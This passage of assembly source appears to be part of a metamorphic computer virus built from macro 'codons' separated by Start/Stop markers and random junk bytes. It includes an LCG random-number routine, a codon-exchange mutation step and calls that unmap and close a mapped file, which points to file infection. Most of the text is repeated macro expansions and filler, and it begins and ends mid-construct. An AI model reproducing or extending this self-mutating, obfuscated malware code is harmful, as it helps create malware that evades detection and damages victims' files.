        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 46
db 129
db 196
db 54
db 248
db 181
db 99
db 221
db 254
db 9
db 40
db 173
db 190
db 11
db 198
db 90
db 121
db 115
db 191
db 163
db 54
db 131
db 138
db 213
db 200
db 42
db 133
db 92
db 146
db 23
db 93
db 167
db 79
db 25
db 230
db 86
db 57
db 126
db 151
db 144
db 202
db 171
db 235
db 157
db 114
db 244
db 15
db 192
db 98
db 9
db 10
db 244
db 11
db 109
db 85
db 206
db 6
db 145
db 10
db 14
db 41
db 23
db 128
db 212
db 210
db 200
db 236
db 202
db 225
db 180
db 26
db 78
db 103
db 60
db 32
db 79
db 251
db 192
db 245
db 143
db 120
db 245
db 149
db 228
db 124
db 126
db 167
db 122
db 71
db 235
db 99
db 71
db 4
db 187
db 12
db 233
db 236
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 184
db 155
db 153
db 119
db 23
db 91
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 209
db 112
db 214
db 79
db 254
db 76
db 169
db 6
db 87
db 69
db 168
db 210
db 86
db 146
db 206
db 44
db 5
db 57
db 198
db 224
db 151
db 188
db 70
db 133
db 61
db 54
db 74
db 169
db 184
db 72
db 186
db 198
db 105
db 203
db 149
db 123
db 178
db 115
db 10
db 230
db 202
db 122
db 216
db 201
db 43
db 181
db 104
db 176
db 9
db 114
db 26
db 165
db 75
db 70
db 237
db 122
db 135
db 192
db 101
db 6
db StartCodon
        _pushall        ; Restore ZF
db StopCodon
db 12
db 56
db 53
db 74
db 0
db 219
db 85
db 90
db 160
db 130
db 80
db StartCodon
        _save
        _and
        _popall
    end if
       _push
       _getEIP
       _sub0001
       _sub0001
       _sub0001
       _sub0001
db StopCodon
db 93
db 155
db 218
db 92
db 78
db 174
db 174
db 230
db 47
db 190
db 49
db 93
db 81
db 173
db 93
db 238
db 251
db 193
db 4
db 9
db 125
db 92
db 193
db 37
db 26
db 210
db 141
db 26
db 178
db 241
db 241
db 55
db 170
db 151
db 63
db 236
db 51
db 157
db 220
db 61
db 248
db 10
db 238
db 175
db 147
db StartCodon
       _sub0001
       _saveJmpOff
db StopCodon
db 121
db 32
db 31
db 186
db 99
db 199
db 191
db 196
db 103
db 3
db StartCodon
               _nopsD       ; Codon-Sequence Start
db StopCodon
db 57
db 0
db 74
db 189
db 251
db 117
db 165
db 99
db 60
db 217
db 99
db 223
db 36
db 96
db 249
db 18
db 4
db 71
db 23
db 122
db 104
db 182
db 209
db 30
db 54
db StartCodon
               _save
db StopCodon
db 251
db 184
db 144
db 20
db 199
db 125
db 71
db 86
db 102
db 221
db 74
db 247
db 39
db 174
db 231
db 123
db 239
db 138
db 56
db 138
db 119
db 187
db 18
db 19
db 46
db 101
db 83
db 127
db 2
db 233
db 17
db 250
db 248
db 32
db 29
db 141
db 134
db StartCodon
               _pop
               _push        ; counter
               _addsaved
               _saveWrtOff
               _getdata
               _push
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=255
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 215
db 226
db 14
db 221
db 213
db 200
db 122
db 212
db 114
db 173
db 148
db 84
db 129
db 93
db 74
db 103
db 178
db 143
db 100
db 188
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _save
               _pop
               _and         ; BC1=one byte
               _save
               _nopsA
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _sub0001        ; BC1=0xFFFFFFFF
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+(-BC2)
               _JnzDown
                       _nopsB
                       _writeByte           ; If equal: exchange codon!
                       _nopREAL
                       _nopREAL
               _pushall
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
db StopCodon
db 224
db 27
db 92
db 49
db 37
db 81
db 35
db 87
db 78
db 49
db 248
db 177
db 7
db 243
db 202
db 170
db 35
db 70
db 77
db 98
db 255
db 104
db 140
db 108
db 178
db 40
db 94
db 42
db 158
db 220
db 252
db 8
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 154
db 148
db 20
db 17
db 169
db 59
db 144
db 75
db 180
db 219
db 17
db 82
db 253
db 177
db 117
db 27
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 6
db 25
db 196
db 241
db 54
db 66
db 92
db 98
db 85
db 246
db 144
db 35
db 84
db 176
db 198
db 161
db 114
db 165
db 156
db 124
db 144
db 194
db 32
db 123
db 230
db 101
db 154
db 225
db 162
db 26
db 16
db 54
db 234
db 70
db 45
db 191
db 6
db 145
db 98
db 184
db 21
db 2
db 222
db 190
db 38
db 143
db 181
db 226
db 193
db 240
db 166
db 62
db 121
db 148
db 10
db 160
db 143
db 245
db 97
db 39
db 102
db 117
db 243
db 245
db 54
db 176
db 0
db 253
db 180
db 204
db 43
db 219
db 134
db 255
db 115
db 200
db 150
db 197
db 151
db 121
db 244
db 174
db 127
db 235
db 221
db 5
db 166
db 122
db 142
db 210
db 13
db 114
db 124
db 18
db 149
db StartCodon
        _save
        _and
        _popall
    end if
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
db StopCodon
db 169
db 254
db 252
db 230
db 27
db 81
db 223
db 132
db 218
db 3
db 75
db 174
db 208
db 52
db 201
db 60
db 89
db 186
db 163
db 237
db 183
db 192
db 110
db 75
db 213
db 167
db 225
db 202
db 238
db 61
db 68
db 53
db 244
db 246
db 252
db 27
db 2
db 39
db 109
db 118
db 39
db 141
db 111
db 1
db 149
db 86
db 41
db 88
db 42
db 51
db 157
db 60
db 199
db 183
db 181
db StartCodon
               _popall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 127
db 108
db 15
db 254
db 238
db 44
db 175
db 130
db 150
db 172
db 74
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 86
db 75
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _save
    _getDO
db StopCodon
db 198
db 22
db 252
db 191
db 50
db 105
db 206
db 118
db 107
db 246
db 119
db 200
db 105
db 117
db 217
db 32
db 221
db 244
db 211
db 230
db 142
db 150
db 224
db 137
db 124
db 234
db 222
db 252
db 16
db StartCodon
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 199
db 213
db 177
db 168
db 39
db 68
db 14
db 173
db 110
db 207
db 202
db 69
db 107
db 107
db 50
db 88
db 200
db 207
db 174
db 46
db 247
db 147
db 231
db 181
db 209
db 176
db 245
db 191
db 71
db 51
db 205
db 125
db 234
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _and
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _save                ; BC2=(rand%8)+1
               _pop
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
db StopCodon
db 78
db 178
db 103
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _sub0001        ; BC1=0xFFFFFFFF
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
db StopCodon
db 139
db 0
db 202
db 127
db 109
db 156
db 178
db 20
db 224
db 50
db 198
db 232
db 198
db 133
db 251
db 7
db 170
db 120
db 85
db 1
db 234
db 209
db 53
db 2
db 134
db 44
db 198
db 206
db 39
db 163
db 216
db 7
db 123
db 194
db 241
db 155
db 225
db 225
db 90
db 215
db 52
db 107
db 11
db 138
db 177
db 147
db StartCodon
        _addsaved       ; BC1=BC1+(-BC2)
               _push
db StopCodon
db 87
db 216
db 111
db 88
db 197
db StartCodon
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=4293918720
    AlreadyStarted=0
db StopCodon
db 58
db 2
db 198
db 236
db 225
db 160
db 136
db 182
db 7
db 157
db 21
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _save
               _pop
               _push
               _and                 ; BC1=(counter%0xFFF0 0000)
               _JnzDown
                       _add0001  ; Not finished
                       _JnzUp       ; Next step
                       _nopREAL
                       _nopREAL
       _pop         ; counter away from stack
       _push        ; trash
     RPBlock3End1:
       _pop         ; return value from call
    _getDO
    BigNum=MapPointer-DataOffset
    AlreadyStarted=0
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _push
    _getDO
    BigNum=hUnmapViewOfFile-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 203
db 8
db 58
db 92
db 239
db 249
db 69
db 75
db 88
db 130
db 32
db 133
db 210
db 144
db 193
db 65
db 99
db 131
db 25
db 22
db 200
db 218
db 242
db 92
db 95
db 26
db 212
db 106
db 18
db 183
db 133
db 136
db 167
db 71
db 98
db 199
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 202
db 238
db 139
db 252
db 136
db 154
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
    _getDO
    BigNum=MapHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 84
db 148
db 201
db 35
db 229
db 192
db 230
db 148
db 212
db 28
db 57
db 229
db 153
db 211
db 45
db 215
db 101
db 89
db 94
db 161
db 177
db 112
db 8
db 118
db 36
db 55
db 144
db 4
db 139
db 251
db 67
db 204
db 202
db 12
db 251
db 199
db 135
db 252
db 239
db 21
db 189
db 93
db 90
db 118
db 61
db 44
db 25
db 111
db 241
db 202
db 179
db 56
db 61
db 111
db 22
db 245
db 72
db 45
db 255
db 251
db 246
db 84
db 73
db 225
db 164
db 30
db 39
db 115
db 67
db 149
db 201
db 31
db 240
db 176
db 59
db 126
db 227
db 105
db 10
db 12
db 185
db 111
db 71
db 177
db 217
db 211
db 201
db 64
db 247
db 25
db 93
db 121
db 46
db 49
db 191
db 231
db 82
db 177
db 123
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 47
db 241
db 41
db 150
db 247
db 93
db 193
db 90
db 142
db 77
db 26
db 245
db 243
db 177
db 63
db 118
db 81
db 172
db 159
db 249
db 10
db 101
db 155
db 148
db 158
db 211
db 107
db 37
db 149
db 168
db 242
db 130
db 108
db 143
db 249
db 192
db 12
db 32
db 68
db 119
db 113
db 98
db 100
db 46
db 57
db StartCodon
        _save
        _and
        _popall
    end if
       _getdata
       _push
    _getDO
    BigNum=hCloseHandle-DataOffset
    AlreadyStarted=0
db StopCodon
db 23
db 118
db 44
db 91
db 4
db 15
db 65
db 174
db 129
db 54
db 247
db 226
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 7
db 200
db 119
db 189
db 149
db 24
db 209
db 226
db 176
db 21
db 39
db 59
db 95
db 125
db 176
db 98
db 142
db 36
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 201
db 246
db 70
db 76
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
